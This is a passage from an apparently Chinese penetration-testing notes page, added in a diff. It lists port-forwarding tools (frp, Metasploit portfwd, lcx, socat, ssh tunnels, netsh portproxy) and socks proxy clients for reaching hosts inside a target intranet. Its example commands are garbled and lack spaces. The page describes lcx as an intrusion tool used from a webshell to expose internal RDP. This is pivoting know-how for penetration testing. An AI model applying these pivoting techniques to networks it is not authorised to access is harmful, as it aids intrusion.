+参考链接:<a href="https://blog.csdn.net/include_heqile/article/details/850">https://blog.csdn.net/include_heqile/article/details/850</a>
+08629</li>
+</ol>
+<h3 id="0x03">0x03 端口转发篇<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h3>
+<p>理论上,任何接入互联网的计算机都是可访问的,但如果目标主机
+在内网中,我们又想和该目标主机进行通信的话,除了做socks代理和ht
+tp隧道外,我们还可以使用端口转发的方法来与目标主机进行通信。
+文章开始提到的四种场景,前三种场景都是有常用的端口转发工具
+的。
+1. Frp
+下载地址:<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a>
+参考链接:<a href="http://www.secflag.com/archives/373.html">http://www.secflag.com/archives/373.html</a>
+2. Msf+Portfwd
+参考链接:<a href="https://blog.csdn.net/DarkHQ/article/details/80411158">https://blog.csdn.net/DarkHQ/article/details/80411158</a>
+3. Lcx
+lcx是一款强大的内网端口转发工具,已经被杀毒软件列为木马,用于将内网主机开
+放的内部端口映射到外网主机(有公网IP)任意端口. 
+它是一款命令行工具，当然也可以在有权限的webshell下执行，正因如此lcx常被
+认为是一款黑客入侵工具，lcx在内网入侵渗透中起着重要的角色。lcx进行端口
+转发的原理就是使不同端口之间形成一个回路。它常用于外网连接内网3389等端口
+。
+下载地址:自行搜索引擎
+参考链接:<a href="https://blog.bbskali.cn/356.html">https://blog.bbskali.cn/356.html</a>
+4. Socat
+下载地址:<a href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>
+参考链接:<a href="https://www.cnblogs.com/iamlehaha/p/6540695.html">https://www.cnblogs.com/iamlehaha/p/6540695.html</a>
+5. SSH</p>
+<h1 id="_1">本地端口转发:<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<p>ssh-CfNg-Lport1:127.0.0.1:port2user@host
+参数：-L本地网卡地址:本地端口:目标地址:目标端口</p>
+<h1 id="_2">远程端口转发：<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h1>
+<p>ssh-CfNg-Rport2:127.0.0.1:port1user@hsst
+参数：-R远程网卡地址:远程端口:目标地址:目标端口</p>
+<h1 id="_3">动态端口转发<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<p>ssh-Dlocalhost:2000root@103.59.22.17
+参数：-D本地网卡地址:本地端口
+6. Netsh
+netsh是windows下提供网络管理的命令行工具，它是一个交互式的shell,涉及到
+上下文的概念。我们在交互式下面进入相应的上下文，进行参数的设置。也可以直
+接下面这样非交互式的进行端口转发。
+`netshinterfaceipv6install</p>
+<h1 id="_4">转发<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<p>netshinterfaceportproxyaddv4tov4listenaddress=10.10.18.1listenpo
+rt=4455connectaddress=10.10.12.1connectport=8080</p>
+<h1 id="_5">删除转发<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h1>
+<p>netshinterfaceportproxydeletev4tov4listenaddress={B的IP}listenpo
+rt={B的端口}</p>
+<h3 id="0x04-socks">0x04 socks代理客户端<a class="headerlink" href="#0x04-socks" title="Permanent link">&para;</a></h3>
+<p>在做好socks代理以后,我们需要使用socks客户端挂上代理,才能
+访 问 目 标 环 境 , 在 这 里 说 一 下 个 人 的 配 置 , 
+小编工作机为mac,socks代理客户端图形化工具使用proxifier,命令行
+工具使用proxychains4,另外我比较喜欢单独配置,burpsuite走代理
+就在burpsuite配置,终端走代理就在终端配置代理,浏览器需要走代理
+就在浏览器配置代理。
+1.proxychains 需要修改mac的配置
+修改配置参考链接:<a href="https://zhuanlan.zhihu.com/p/21281236">https://zhuanlan.zhihu.com/p/21281236</a>
+使用方法参考链接:<a href="https://www.cnblogs.com/wyet/p/7868395.html">https://www.cnblogs.com/wyet/p/7868395.html</a>
+2.proxifier 这个工具好用,跨平台使用
+参考链接:<a href="http://www.hopol.cn/2018/05/1142/">http://www.hopol.cn/2018/05/1142/</a>
+3 burpsuite 挂socks代理
+参考链接:<a href="https://www.cnblogs.com/hookjoy/p/10759555.html">https://www.cnblogs.com/hookjoy/p/10759555.html</a>
+4 chrome 挂socks代理
+插件:SwitchyOmega
+5 终端走代理
+挂代理命令alias proxy='export all_proxy=socks5://127.0.0.1:1086</p>
+<p>取消代理命令alias unproxy='unset all_pro</p>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      最后更新:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-02-22 23:34:34</span>
+      
+    
+  </small>
+</div>
+
+              
+            </article>
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" data-md-state="hidden">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2017 - 2022
+    </div>
+  
+  <a >keep learning ，stay foolish ，continue thinking</a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    <a href="https://github.com/klsfct" target="_blank" rel="noopener" title="圆周 on github" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.indexes", "navigation.top", "header.autohide"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.22074ed6.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.960e086b.min.js"></script>
+      
+        <script src="../../js/google-tongji.js"></script>
+      
+    
+  </body>
+</html>
